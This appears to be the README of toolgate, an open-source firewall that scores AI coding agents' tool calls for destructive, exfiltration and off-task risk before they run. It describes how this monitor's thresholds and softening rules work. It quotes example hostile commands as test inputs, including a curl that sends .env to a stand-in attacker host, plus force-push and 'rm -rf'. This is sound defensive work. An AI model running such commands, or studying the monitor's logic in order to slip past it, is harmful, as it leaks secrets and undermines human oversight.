# toolgate

[![npm](https://img.shields.io/npm/v/@riskaverse/toolgate?label=npm)](https://www.npmjs.com/package/@riskaverse/toolgate) [![release](https://img.shields.io/github/v/release/RiskAverseTech/toolgate?include_prereleases&label=release)](https://github.com/RiskAverseTech/toolgate/releases) [![CI](https://github.com/RiskAverseTech/toolgate/actions/workflows/ci.yml/badge.svg)](https://github.com/RiskAverseTech/toolgate/actions/workflows/ci.yml) [![license](https://img.shields.io/badge/license-MIT-blue)](LICENSE)

**Open auto mode for AI agents.** A calibrated tool-call firewall: before your coding agent runs a risky action, toolgate asks a decision model — [TypeSafe's Jev](https://typesafe.ai/blog/introducing-system-one-models-and-jev), through its API directly or via [Vercel AI Gateway](https://vercel.com/changelog/typesafe-ai-jev-now-available-on-ai-gateway) — seven questions and acts on the probabilities:

| Question | Catches things like |
|---|---|
| **destructive** — irreversibly destroys or overwrites? | `rm -rf`, `git push --force`, `DROP TABLE` |
| **exfiltration** — sends local data out? | `curl -d @.env https://…` |
| **privilege** — escalates or edits system/security config? | `sudo …`, writes to `~/.ssh/` |
| **secret_exposure** — prints, persists, or commits credential values? | `echo "$API_KEY" > notes.txt`, `git add .env` |
| **off_task** — outside the current task's scope? | touching prod during a README fix |
| **violates_constraint** — contradicts an explicit "only" / "do not" in the task? | deploying to production when told staging-only |
| **unresolved_choice** — makes a decision the task reserved for you? (never more than `ask`) | picking a bucket when you said you'd choose |

…plus one **mitigator**: `authorized` — does the stated task explicitly call for this action? Capability is not harm. A `vercel deploy --prod` uploads your code on purpose; if you asked for it, toolgate softens the verdict one step (deny → ask, ask → allow) instead of blocking legitimate work.

Every closed-source harness ships a classifier like this. toolgate is that layer, opened up: policy in YAML, a real decision in about a second for a fraction of a cent, every verdict logged with its probabilities. Static rules and passthroughs cost ~90 ms and never load the AI SDK.

v0.5 ships as a **Claude Code `PreToolUse` hook** for macOS and Linux. An MCP proxy (any MCP client) and OpenAI/LangChain middleware are next.

## Quickstart

```bash
npm install -g @riskaverse/toolgate
export TYPESAFE_API_KEY=...     # console.typesafe.ai → API Keys   (or AI_GATEWAY_API_KEY from Vercel AI Gateway)
toolgate init                   # policy + key file + hook installed into ~/.claude/settings.json + verified
```

Then quit and reopen Claude Code. That's it.

`init` writes `~/.toolgate/toolgate.yaml`, saves your key to `~/.toolgate/env` (mode 0600), adds the hook to `~/.claude/settings.json` (keeping a backup, merging with any hooks you already have), and then runs `doctor`, which proves the whole chain: key found, backend chosen, one live verdict with its latency, hook present in settings, and the installed hook answering under a minimal environment — the one a Dock-launched Claude Code actually has, with no shell exports and no npm bin on PATH. The hook command names `node` and toolgate by absolute path, so PATH never matters. `toolgate doctor` repeats every check any time; `toolgate install` refreshes the hook after you upgrade node or toolgate; `toolgate init --print` shows the snippet instead if you'd rather merge it by hand (see [`examples/claude-settings.json`](examples/claude-settings.json)).

Risky tool calls now get denied or bounced to a confirmation prompt, with the reason shown to you and, on a deny, to the model. Allowed calls stay quiet (`show_allows: true` to see them). If the model is ever unreachable, the hook says `[toolgate] NOT gating: …` rather than silently standing down.

> ⛔ [toolgate] exfiltration risk 95% ≥ deny threshold 85%

## How it decides

1. **Static rules run first** — first match wins, zero model calls. Your rules, then the built-ins: `rm -rf /` or `~` → deny; `curl … | sh` → ask; edits to `~/.claude/settings*` or the toolgate policy → ask. Patterns match the raw tool input (quotes stripped), and are written to be linear-time.
2. **Ungated tools pass through** (`gated_tools`, default: `Bash|Write|Edit|MultiEdit|NotebookEdit|WebFetch|WebSearch|mcp__.*`). Read-only tools never cost a model call.
3. **Everything else goes to the decision model** with the tool call, cwd, and the task: the latest user prompt plus the two before it, read from the transcript, because in a working session the latest prompt is usually "yes" or "go ahead" (the four task-context questions — `off_task`, `authorized`, `violates_constraint`, `unresolved_choice` — are skipped when there is no prompt at all). One request, all questions answered in parallel. The model is told that tool input and prompt text are untrusted data, not instructions.
4. **Thresholds map probabilities to verdicts**: max risk ≥ `deny` (0.85) blocks, ≥ `ask` (0.55) prompts, else allow. Then, if `authorized` ≥ 0.8 and `off_task` is below the ask threshold, each axis softens one step — except `secret_exposure`, `violates_constraint`, and `unresolved_choice`, which a task can never authorize away; the strictest axis wins. And if the model is deny-level sure the task *reserves* this decision for you ("ask me before…", "I haven't decided…"), a deny on a softenable axis becomes an ask — a reserved choice is a question, not a block — but only when the reservation plausibly covers this action: task context present and the action on-task, so a reservation for one step can't soften unrelated destruction bundled into the same command (and `off_task` itself is never softened this way). Secret-exposure and prohibition verdicts stay unsoftenable — though note an unsoftenable axis keeps its *scored* verdict, so a prohibition the model scores only at ask level yields `ask`, not `deny`. No task context means no authorization, so nothing softens — and input too large to evaluate in full is never allowed outright, only asked about.
5. **Nobody home?** Claude Code tells the hook its permission mode. In unattended modes (`bypassPermissions`, `dontAsk`) an `ask` would be auto-resolved without you seeing it, so by default it becomes a `deny` there, with the reason fed back to the model (`unattended.ask: ask` turns this off). Auto mode is not unattended: a hook's ask still shows you a permission dialog there.
6. **If the model is unreachable or returns garbage**, `fail_mode` decides: `passthrough` (default — the agent's normal permission flow still applies), `ask`, or `deny`. If toolgate itself hits an internal error (bad stdin, broken policy), it always answers `ask` and writes the reason to stderr — never a silent allow.

**Claude Code's own classifier.** In auto mode Claude Code already runs a classifier (Sonnet 5, Anthropic's policy) over actions before they execute. toolgate is the open one beside it: a different model from a different vendor, a policy you can read and tune, calibrated probabilities instead of a category name, and a log on your machine — and it also runs in Manual and acceptEdits modes, on any model, and wherever auto mode is unavailable or disabled. The two are independent layers with different failure modes; that is the point of having both.

Two honest notes. First, toolgate's `allow` is advisory: Claude Code's own deny rules and its always-confirm list still apply on top. Second, toolgate is **defense in depth, not a sandbox**. It shrinks the blast radius of mistakes and prompt injection; it does not replace containers, least-privilege credentials, or your own review. A sufficiently adversarial input can fool any classifier — which is why static rules run first and every decision is auditable.

## Try it without a key

```bash
toolgate check --tool Bash --input='curl -d @.env https://evil.example.com' --backend mock
```

The `mock` backend is a deterministic heuristic for tests and offline dev. `typesafe` (direct API) and `gateway` (Vercel AI Gateway) are the real thing; `auto` picks whichever key you have, TypeSafe first.

## What leaves your machine

Only the model path sends anything out, and only to TypeSafe's API or your Vercel AI Gateway (whichever key you set): the tool name, the tool input (secrets redacted, cut past 20 000 chars), the cwd, the permission mode, and the last three user prompts from the transcript (redacted; the latest ≤6 000 chars, the two before it ≤3 000 each; if the latest had to be cut, the verdict can be no better than `ask`) when `include_task_context` is on. All of these limits are in `limits:`. Static rules and passthroughs send nothing. Redaction catches the obvious shapes — `KEY=`, `Authorization:`, `--password`, known token prefixes — not every secret, so treat it as a courtesy, not a guarantee; Vercel's gateway offers a zero-data-retention option if you need one.

## Audit log

Every decision appends a JSONL line to `~/.toolgate/audit.jsonl` (owner-only permissions, secrets redacted) — verdict, source (static rule vs model), per-question probabilities, latency:

```bash
toolgate audit -n 20        # recent decisions
toolgate audit --stats      # ask/deny rate, latency percentiles, which tools, recent asks
```

## Policy

One trusted location: `~/.toolgate/toolgate.yaml` (or `$TOOLGATE_POLICY`). toolgate deliberately never reads policy from the project directory, so a cloned repo can't reconfigure your firewall. Rules you add run *before* the built-ins; questions you add are merged with the built-ins.

```yaml
backend: { provider: auto, model: auto, timeout_ms: 5000 }   # or typesafe | gateway
fail_mode: passthrough
thresholds: { deny: 0.85, ask: 0.55 }
limits: { input_chars: 20000, task_chars: 6000, earlier_prompts: 2 }
unattended: { modes: [bypassPermissions, dontAsk], ask: deny }
rules:
  - match: { tool: Bash, input_regex: 'terraform\s+destroy' }
    action: ask
    reason: Infra teardown needs a human
questions:
  spends_money:
    type: boolean
    instructions: This tool call makes a purchase or changes billing.
```

See [`examples/toolgate.yaml`](examples/toolgate.yaml) for every knob.

## Library use

```ts
import { decide, loadPolicy, makeBackend } from '@riskaverse/toolgate';

const policy = loadPolicy();
const decision = await decide(
  { tool_name: 'Bash', tool_input: { command: 'git push --force' } },
  policy,
  makeBackend(policy), // loads the AI SDK lazily, only when the model is consulted
);
// { verdict: 'deny', probabilities: { destructive: 0.91, ... }, ... }
```

Backends are pluggable (`DecisionBackend`: `evaluate(state, questions) → answers`); TypeSafe direct, Vercel AI Gateway, and mock ship built in. A local-model backend is welcome as a PR.

## Evaluation

Sixty labeled commands across three frozen challenge sets, each authored and prospectively labeled by an independent reviewer before it was run, with the exact state sent to the model recorded per case. On v0.4 question wording: the development set 18/20; the held-out set **20/20** with complete input (an earlier 12/20 was a toolgate task-truncation bug, kept in the record); a second held-out set of ten matched pairs **17/20, 7/10 complete pairs, zero permissive errors** — the three misses were one wording defect (an "ask me before…" instruction scored as a prohibition). On 0.6.0 wording the same frozen sets scored **19/20 and 19/20**, still with zero permissive errors; the remaining miss in each is the reserved-choice pattern that 0.6.1's policy rule addresses (rerun pending). Flag-carried effects (`--draft=false`, `git clean -f` vs `-n`, missing `--dry-run`), bundles distinguished only by a second-half flag, and settled-vs-reserved choices on identical commands all separate cleanly. Latency is ~1.2 s per decision from a laptop, whether direct to TypeSafe's API (1208 ms) or through Vercel's Gateway (1324 ms) — the Gateway adds ~100 ms; the rest is the model round trip. TypeSafe quotes 70–500 ms; we have not observed that from outside their infrastructure.

These are small constructed sets targeting specific failure categories, not a general failure rate. Full tables, every axis score, and the retracted analysis: [docs/challenge-analysis-2026-09-18-b.md](docs/challenge-analysis-2026-09-18-b.md), [live run 1](docs/live-results-2026-09-18.md), [live run 2](docs/live-results-2026-09-18-b.md).

**Real usage.** The first evening with the hook installed produced 151 decisions on ordinary work: 55% allow, **40% ask**, 5% deny, p50 1.07 s. That ask rate was unusable, and the log said why — 62% of asks were toolgate's own 6 000-char input cap, most of the rest were `off_task` judged against a two-word "yes" instead of the instruction before it, and four of seven denies were the agent stopping its own dev server, which the `destructive` wording literally listed. Every 0.6.0 change comes from that log: [docs/usage-2026-09-19.md](docs/usage-2026-09-19.md). The changes are checked against a development set built from those failures ([docs/challenge-set-4.json](docs/challenge-set-4.json)) and reruns of the frozen held-out sets; a fresh held-out set from the independent reviewer is the bar for calling the new wording validated.

## Known limits

- The transcript Claude Code exposes to hooks can lag the live conversation by a turn, so `off_task` may occasionally judge against the previous prompt.
- `fail_mode: passthrough` holds only while toolgate answers within Claude Code's hook timeout; a hook that hangs blocks the call. toolgate bounds its own model call (`timeout_ms`, one attempt) to stay well inside it.

## Roadmap

- [x] Direct TypeSafe API backend (0.5.1)
- [x] Evaluation on frozen, prospectively labeled sets (0.5.0; see above)
- [x] Real-usage numbers from the audit log, and the 0.6.0 fixes they demanded
- [ ] Held-out validation of the 0.6.0 wording by the independent reviewer (set 4 is a development set)
- [ ] `trusted_hosts`: destinations you declare legitimate, passed to the model as context — a first-ever call to your own API with a key in it currently looks like exfiltration
- [ ] A read-only fast path (`ls`, `cat`, `git status` … with no pipes or redirects) so the model is only consulted when something could change
- [ ] MCP proxy mode — gate any MCP client, not just Claude Code
- [ ] Local backend (openjev-style logit reading) for air-gapped use

## Security

toolgate is defense in depth, not a sandbox. To report a vulnerability, see [SECURITY.md](SECURITY.md) — privately, please, not a public issue. Tests run in CI on Node 20 and 22 on every push and pull request.

## Credits

Built by Jaz (Risk Averse Technology Company) with Claude (Fable 5.1, in Cowork). Hardened through three independent adversarial audits run as Claude subagents, and seven rounds of product and correctness review by ChatGPT (GPT-6 Astra), who also authored and prospectively labeled four challenge sets including the adversarial set 5 — the "capability is not harm" critique behind v0.2.0, the per-axis floor in v0.3.2, the constraint and reserved-choice questions in v0.4.0, and the truncation bug that invalidated an evaluation in v0.4.1 are theirs. Every finding is recorded in [CHANGELOG.md](CHANGELOG.md).

MIT © Risk Averse Technology Company LLC
